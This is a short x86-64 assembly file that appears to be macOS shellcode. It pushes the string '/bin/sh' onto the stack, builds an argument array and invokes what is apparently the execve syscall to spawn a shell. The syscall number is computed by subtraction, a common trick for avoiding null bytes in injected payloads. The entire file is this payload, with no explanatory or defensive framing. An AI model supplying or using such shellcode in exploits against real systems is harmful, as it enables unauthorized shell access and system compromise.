global _main

section .data
	db 0
	
section .text

_main:	
	mov rdi, 0x1068732f6e69622f ; /bin/sh
	mov rax, 0x01ffffffffffffff
	and rdi, rax
	xor rax, rax
	
	push rdi		; push /bin/sh
	mov rdi, rsp		; load ptr to /bin/sh
	
	push rax		; constructs args
	push rdi
	mov rsi, rsp
	sub esp, 4
	mov rdx, rax
	mov rax, 0x411114b
	sub rax, 0x2111110
	syscall
